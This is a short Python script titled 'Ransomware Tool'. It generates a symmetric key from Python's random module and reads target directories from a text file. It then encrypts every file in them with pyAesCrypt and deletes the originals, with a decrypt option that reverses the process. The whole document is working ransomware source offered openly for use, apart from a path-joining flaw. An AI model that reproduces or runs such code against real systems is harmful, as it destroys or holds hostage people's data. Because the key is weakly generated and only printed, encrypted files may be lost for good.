# Import Libraries
import pyAesCrypt
import string
import random
import os

# Define Functions
def clear():
    os.system('clear')

def int_input_getter(prompt, num_range):
    while True:
        # Test for errors.
        try:
            choice = int(input(prompt))
        # If there is a value error pass so the loop can restart.
        except ValueError:
            pass
        # Otherwise, test to see if the number chosen is available.
        else:
            # If the number is available then return that number.
            if choice in num_range:
                return choice
            else:
                print("That is not an option!")
                input("Press enter to continue...")

def gen_key():
    # Generate Symmetric Key & Store in Variable
    clear()
    global sym
    passwd=''
    for i in range (15):
        nums = string.digits
        passwd+=random.choice(nums)
    for i in range (15):
        letters = string.ascii_letters
        passwd+=random.choice(letters)
    l=list(passwd)
    random.shuffle(l)
    sym= ''.join(l)
    print("Symmetric Key is: " + sym)
    print()

def enum_files():
    # Read Target Directories from 'dir.txt' & Enumerate Them
    f = open('dirs.txt', 'r')
    target_dirs = f.readlines()
    global files
    files=[]
    for dir in target_dirs:
        dir_files = []
        # Enumerate Target Directory & Populate List
        dir_files += os.listdir(dir.strip())
        for i in dir_files:
          path = dir.strip() + i
          index_of_file = dir_files.index(i)
          dir_files[index_of_file] = path
        files+=dir_files

def encrypt():
    enum_files()
    # Encrypt Files
    clear()
    global bufferSize
    bufferSize = 64 * 1024
    print('Encrypting Files...')
    for i in files:
        new_name=i+'.aes'
        pyAesCrypt.encryptFile(i, new_name, sym, bufferSize)
        # Delete Originals
        os.remove(i)
    print("Data is now encrypted :)")
    print()

def decrypt():
    enum_files()
    # Decrypt Files
    clear()
    global bufferSize
    bufferSize = 64 * 1024
    print('Decrypting Files...')
    for i in files:
        new_name=i.replace('.aes', '')
        pyAesCrypt.decryptFile(i, new_name, sym, bufferSize)
        # Delete Originals
        os.remove(i)
    print("Data is now decrypted :)")
    print()

# Main Program
main_menu = """Ransomware Tool
1. Gen-key
2. Encrypt
3. Decrypt
4. Quit
"""

while True:
    uio = int_input_getter(main_menu, range(1, 5))
    if uio == 1:
        gen_key()
    elif uio == 2:
        encrypt()
    elif uio == 3:
        decrypt()
    else:
        exit(0)
